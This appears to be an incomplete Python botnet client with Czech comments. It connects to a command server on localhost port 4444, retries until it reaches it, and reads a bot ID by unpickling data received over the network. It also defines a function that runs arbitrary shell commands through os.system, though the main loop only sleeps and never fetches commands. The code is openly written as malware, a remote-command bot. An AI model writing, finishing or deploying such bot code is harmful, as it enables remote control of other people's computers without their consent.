import socket
import pickle
import time
import platform
import os
import sys

SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444
BOT_ID = None

# Funkce pro připojení k serveru
def connect_to_server():
    global BOT_ID
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            BOT_ID = pickle.loads(client_socket.recv(4096))['id']
            print(f"Bot připojen s ID: {BOT_ID}")
            break
        except ConnectionRefusedError:
            print("Server offline, retrying...")
            time.sleep(5)

# Funkce pro vykonání příkazu (shell)
def execute_shell_command(command):
    try:
        if platform.system() == "Windows":
            os.system(command)  # Pro Windows
        else:
            os.system(command)  # Pro Linux
    except Exception as e:
        print(f"Chyba při provádění příkazu: {e}")

if __name__ == "__main__":
    connect_to_server()

    while True:
        time.sleep(1)  # Zůstaneme online a čekáme na příkazy
